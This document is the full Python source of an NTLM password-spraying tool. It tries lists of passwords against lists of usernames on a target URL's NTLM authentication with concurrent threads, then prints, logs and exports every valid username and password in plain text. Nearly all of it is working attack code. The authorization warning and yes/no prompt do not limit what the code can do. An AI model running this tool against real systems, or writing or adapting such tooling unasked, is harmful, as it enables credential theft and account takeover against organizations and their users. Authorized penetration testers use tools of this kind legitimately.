"""
NTLM Password Spray Tool

A secure password spraying tool for testing NTLM authentication endpoints.
This tool implements rate limiting, logging, and other security best practices
to prevent account lockouts and ensure responsible security testing.

SECURITY WARNING: This tool is for authorized security testing only.
Ensure you have proper authorization before using in any environment.

Author: Security Automation Team
Version: 2.0.0
License: MIT
"""

import requests
import time
import sys
import argparse
import logging
from typing import List, Dict, Optional, Tuple
from urllib.parse import urlparse
from requests_ntlm import HttpNtlmAuth
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from dataclasses import dataclass


# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ntlm_spray.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)


@dataclass
class SprayResult:
    """Data class to store spray attempt results"""
    username: str
    password: str
    success: bool
    status_code: int
    response_time: float
    error_message: Optional[str] = None


class NTLMPasswordSprayer:
    """
    NTLM Password Spraying Tool
    
    This class provides a secure framework for testing NTLM authentication
    with proper rate limiting, logging, and error handling to prevent
    account lockouts and ensure responsible security testing.
    """
    
    def __init__(self, fqdn: str, users: List[str], 
                 delay_between_attempts: float = 1.0,
                 max_threads: int = 5,
                 timeout: int = 30,
                 verbose: bool = False):
        """
        Initialize the NTLM Password Sprayer
        
        Args:
            fqdn (str): Fully Qualified Domain Name
            users (List[str]): List of usernames to test
            delay_between_attempts (float): Delay between attempts in seconds
            max_threads (int): Maximum number of concurrent threads
            timeout (int): Request timeout in seconds
            verbose (bool): Enable verbose logging
        """
        self.fqdn = fqdn
        self.users = users
        self.delay_between_attempts = delay_between_attempts
        self.max_threads = max_threads
        self.timeout = timeout
        self.verbose = verbose
        
        # HTTP status codes
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_FORBIDDEN_CODE = 403
        self.HTTP_NOT_FOUND_CODE = 404
        
        # Results storage
        self.successful_credentials: List[SprayResult] = []
        self.failed_attempts: List[SprayResult] = []
        self.errors: List[SprayResult] = []
        
        # Thread safety
        self._lock = threading.Lock()
        
        # Session configuration
        self.session = requests.Session()
        self.session.timeout = self.timeout
        self._configure_session()
        
    def _configure_session(self):
        """Configure the requests session with security headers"""
        self.session.headers.update({
            'User-Agent': 'NTLMPasswordSprayer/2.0.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        
    def _validate_url(self, url: str) -> bool:
        """
        Validate URL format and accessibility
        
        Args:
            url (str): URL to validate
            
        Returns:
            bool: True if URL is valid
        """
        try:
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                logger.error(f"Invalid URL format: {url}")
                return False
                
            # Test connectivity without authentication
            try:
                response = self.session.get(url, timeout=10, allow_redirects=False)
                if response.status_code in [401, 403]:
                    # Expected for NTLM endpoints
                    return True
                elif response.status_code == 200:
                    logger.warning(f"URL {url} does not require authentication")
                    return True
                else:
                    logger.warning(f"Unexpected response code {response.status_code} from {url}")
                    return True
                    
            except requests.RequestException as e:
                logger.error(f"Cannot connect to {url}: {e}")
                return False
                
        except Exception as e:
            logger.error(f"URL validation error: {e}")
            return False
            
        return True
    
    def _attempt_authentication(self, username: str, password: str, url: str) -> SprayResult:
        """
        Attempt NTLM authentication for a single user/password combination
        
        Args:
            username (str): Username to test
            password (str): Password to test
            url (str): Target URL
            
        Returns:
            SprayResult: Result of the authentication attempt
        """
        start_time = time.time()
        
        try:
            # Construct full username with domain
            full_username = f"{self.fqdn}\\{username}"
            
            # Attempt authentication
            response = self.session.get(
                url,
                auth=HttpNtlmAuth(full_username, password),
                timeout=self.timeout,
                allow_redirects=False
            )
            
            response_time = time.time() - start_time
            
            # Analyze response
            if response.status_code == self.HTTP_AUTH_SUCCEED_CODE:
                result = SprayResult(
                    username=username,
                    password=password,
                    success=True,
                    status_code=response.status_code,
                    response_time=response_time
                )
                
                with self._lock:
                    self.successful_credentials.append(result)
                    
                logger.info(f"✓ Valid credential found - {username}:{password}")
                return result
                
            elif response.status_code == self.HTTP_AUTH_FAILED_CODE:
                result = SprayResult(
                    username=username,
                    password=password,
                    success=False,
                    status_code=response.status_code,
                    response_time=response_time
                )
                
                with self._lock:
                    self.failed_attempts.append(result)
                    
                if self.verbose:
                    logger.debug(f"✗ Failed login - {username}:{password}")
                    
                return result
                
            else:
                # Unexpected response code
                result = SprayResult(
                    username=username,
                    password=password,
                    success=False,
                    status_code=response.status_code,
                    response_time=response_time,
                    error_message=f"Unexpected status code: {response.status_code}"
                )
                
                with self._lock:
                    self.errors.append(result)
                    
                logger.warning(f"⚠ Unexpected response for {username} - Status: {response.status_code}")
                return result
                
        except requests.RequestException as e:
            response_time = time.time() - start_time
            result = SprayResult(
                username=username,
                password=password,
                success=False,
                status_code=0,
                response_time=response_time,
                error_message=str(e)
            )
            
            with self._lock:
                self.errors.append(result)
                
            logger.error(f"✗ Network error for {username}: {e}")
            return result
            
        except Exception as e:
            response_time = time.time() - start_time
            result = SprayResult(
                username=username,
                password=password,
                success=False,
                status_code=0,
                response_time=response_time,
                error_message=str(e)
            )
            
            with self._lock:
                self.errors.append(result)
                
            logger.error(f"✗ Unexpected error for {username}: {e}")
            return result
    
    def password_spray(self, password: str, url: str) -> Dict[str, int]:
        """
        Perform password spray attack using the specified password
        
        Args:
            password (str): Password to test against all users
            url (str): Target URL for authentication
            
        Returns:
            Dict[str, int]: Summary of results
        """
        logger.info(f"Starting password spray attack using password: {password}")
        logger.info(f"Target URL: {url}")
        logger.info(f"Testing {len(self.users)} users")
        
        # Validate URL before starting
        if not self._validate_url(url):
            logger.error("URL validation failed. Aborting spray attack.")
            return {'valid_credentials': 0, 'failed_attempts': 0, 'errors': 0}
        
        # Reset counters for this spray
        initial_success_count = len(self.successful_credentials)
        initial_failed_count = len(self.failed_attempts)
        initial_error_count = len(self.errors)
        
        # Use ThreadPoolExecutor for controlled concurrency
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            # Submit all authentication attempts
            future_to_user = {
                executor.submit(self._attempt_authentication, user, password, url): user
                for user in self.users
            }
            
            # Process results as they complete
            for future in as_completed(future_to_user):
                user = future_to_user[future]
                try:
                    result = future.result()
                    
                    # Add delay between attempts to prevent lockouts
                    if self.delay_between_attempts > 0:
                        time.sleep(self.delay_between_attempts)
                        
                except Exception as e:
                    logger.error(f"Thread execution error for user {user}: {e}")
        
        # Calculate results for this spray
        new_success_count = len(self.successful_credentials) - initial_success_count
        new_failed_count = len(self.failed_attempts) - initial_failed_count
        new_error_count = len(self.errors) - initial_error_count
        
        logger.info(f"Password spray completed:")
        logger.info(f"  Valid credentials found: {new_success_count}")
        logger.info(f"  Failed attempts: {new_failed_count}")
        logger.info(f"  Errors: {new_error_count}")
        
        return {
            'valid_credentials': new_success_count,
            'failed_attempts': new_failed_count,
            'errors': new_error_count
        }
    
    def spray_multiple_passwords(self, passwords: List[str], url: str) -> Dict[str, int]:
        """
        Spray multiple passwords against all users
        
        Args:
            passwords (List[str]): List of passwords to test
            url (str): Target URL for authentication
            
        Returns:
            Dict[str, int]: Overall summary of results
        """
        logger.info(f"Starting multi-password spray attack")
        logger.info(f"Testing {len(passwords)} passwords against {len(self.users)} users")
        
        total_results = {'valid_credentials': 0, 'failed_attempts': 0, 'errors': 0}
        
        for i, password in enumerate(passwords, 1):
            logger.info(f"Testing password {i}/{len(passwords)}: {password}")
            
            results = self.password_spray(password, url)
            
            # Update totals
            for key in total_results:
                total_results[key] += results[key]
            
            # Add delay between password attempts
            if i < len(passwords) and self.delay_between_attempts > 0:
                logger.info(f"Waiting {self.delay_between_attempts} seconds before next password...")
                time.sleep(self.delay_between_attempts)
        
        logger.info(f"Multi-password spray completed:")
        logger.info(f"  Total valid credentials: {total_results['valid_credentials']}")
        logger.info(f"  Total failed attempts: {total_results['failed_attempts']}")
        logger.info(f"  Total errors: {total_results['errors']}")
        
        return total_results
    
    def get_successful_credentials(self) -> List[Tuple[str, str]]:
        """
        Get list of successful username/password combinations
        
        Returns:
            List[Tuple[str, str]]: List of (username, password) tuples
        """
        return [(result.username, result.password) for result in self.successful_credentials]
    
    def export_results(self, filename: str = "ntlm_spray_results.txt"):
        """
        Export results to a file
        
        Args:
            filename (str): Output filename
        """
        try:
            with open(filename, 'w') as f:
                f.write("NTLM Password Spray Results\n")
                f.write("=" * 50 + "\n\n")
                
                f.write(f"Successful Credentials ({len(self.successful_credentials)}):\n")
                f.write("-" * 30 + "\n")
                for result in self.successful_credentials:
                    f.write(f"{result.username}:{result.password}\n")
                
                f.write(f"\nFailed Attempts ({len(self.failed_attempts)}):\n")
                f.write("-" * 20 + "\n")
                for result in self.failed_attempts[:10]:  # Limit to first 10
                    f.write(f"{result.username}:{result.password} (Status: {result.status_code})\n")
                
                if len(self.failed_attempts) > 10:
                    f.write(f"... and {len(self.failed_attempts) - 10} more failed attempts\n")
                
                f.write(f"\nErrors ({len(self.errors)}):\n")
                f.write("-" * 10 + "\n")
                for result in self.errors:
                    f.write(f"{result.username}:{result.password} - {result.error_message}\n")
            
            logger.info(f"Results exported to {filename}")
            
        except Exception as e:
            logger.error(f"Failed to export results: {e}")


def load_usernames_from_file(filename: str) -> List[str]:
    """
    Load usernames from a text file
    
    Args:
        filename (str): Path to file containing usernames (one per line)
        
    Returns:
        List[str]: List of usernames
    """
    try:
        with open(filename, 'r') as f:
            usernames = [line.strip() for line in f if line.strip()]
        logger.info(f"Loaded {len(usernames)} usernames from {filename}")
        return usernames
    except FileNotFoundError:
        logger.error(f"Username file not found: {filename}")
        return []
    except Exception as e:
        logger.error(f"Error loading usernames from {filename}: {e}")
        return []


def load_passwords_from_file(filename: str) -> List[str]:
    """
    Load passwords from a text file
    
    Args:
        filename (str): Path to file containing passwords (one per line)
        
    Returns:
        List[str]: List of passwords
    """
    try:
        with open(filename, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
        logger.info(f"Loaded {len(passwords)} passwords from {filename}")
        return passwords
    except FileNotFoundError:
        logger.error(f"Password file not found: {filename}")
        return []
    except Exception as e:
        logger.error(f"Error loading passwords from {filename}: {e}")
        return []


def main():
    """
    Main function with command-line interface
    """
    parser = argparse.ArgumentParser(
        description="NTLM Password Spray Tool - Authorized Security Testing Only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Single password spray
  python ntlm_spray_pass.py -d domain.com -u users.txt -p Password123 -t https://target.com/

  # Multiple password spray
  python ntlm_spray_pass.py -d domain.com -u users.txt -P passwords.txt -t https://target.com/

  # With custom settings
  python ntlm_spray_pass.py -d domain.com -u users.txt -p Password123 -t https://target.com/ --delay 2 --threads 3 -v
        """
    )
    
    parser.add_argument('-d', '--domain', required=True,
                       help='Fully Qualified Domain Name (FQDN)')
    parser.add_argument('-u', '--users', required=True,
                       help='Username list file (one per line)')
    parser.add_argument('-p', '--password',
                       help='Single password to test')
    parser.add_argument('-P', '--passwords',
                       help='Password list file (one per line)')
    parser.add_argument('-t', '--target', required=True,
                       help='Target URL for authentication')
    parser.add_argument('--delay', type=float, default=1.0,
                       help='Delay between attempts in seconds (default: 1.0)')
    parser.add_argument('--threads', type=int, default=5,
                       help='Maximum number of threads (default: 5)')
    parser.add_argument('--timeout', type=int, default=30,
                       help='Request timeout in seconds (default: 30)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose output')
    parser.add_argument('-o', '--output',
                       help='Output file for results (default: ntlm_spray_results.txt)')
    
    args = parser.parse_args()
    
    # Validate arguments
    if not args.password and not args.passwords:
        parser.error("Either --password or --passwords must be specified")
    
    if args.password and args.passwords:
        parser.error("Cannot specify both --password and --passwords")
    
    # Load usernames
    usernames = load_usernames_from_file(args.users)
    if not usernames:
        logger.error("No usernames loaded. Exiting.")
        sys.exit(1)
    
    # Security warning
    print("\n" + "=" * 60)
    print("⚠️  SECURITY WARNING")
    print("=" * 60)
    print("This tool is for authorized security testing only.")
    print("Ensure you have proper authorization before proceeding.")
    print("Unauthorized access to computer systems is illegal.")
    print("=" * 60)
    
    response = input("\nDo you have authorization to test the target? (yes/no): ")
    if response.lower() not in ['yes', 'y']:
        print("Exiting. Only use this tool with proper authorization.")
        sys.exit(0)
    
    # Initialize sprayer
    sprayer = NTLMPasswordSprayer(
        fqdn=args.domain,
        users=usernames,
        delay_between_attempts=args.delay,
        max_threads=args.threads,
        timeout=args.timeout,
        verbose=args.verbose
    )
    
    try:
        # Perform spray attack
        if args.password:
            # Single password spray
            results = sprayer.password_spray(args.password, args.target)
        else:
            # Multiple password spray
            passwords = load_passwords_from_file(args.passwords)
            if not passwords:
                logger.error("No passwords loaded. Exiting.")
                sys.exit(1)
            results = sprayer.spray_multiple_passwords(passwords, args.target)
        
        # Display summary
        print("\n" + "=" * 50)
        print("FINAL RESULTS")
        print("=" * 50)
        print(f"Valid credentials found: {results['valid_credentials']}")
        print(f"Failed attempts: {results['failed_attempts']}")
        print(f"Errors: {results['errors']}")
        
        # Show successful credentials
        successful_creds = sprayer.get_successful_credentials()
        if successful_creds:
            print(f"\nSuccessful Credentials:")
            print("-" * 25)
            for username, password in successful_creds:
                print(f"  {username}:{password}")
        
        # Export results
        output_file = args.output or "ntlm_spray_results.txt"
        sprayer.export_results(output_file)
        
        print(f"\nDetailed results saved to: {output_file}")
        print("=" * 50)
        
    except KeyboardInterrupt:
        print("\n\nOperation cancelled by user.")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
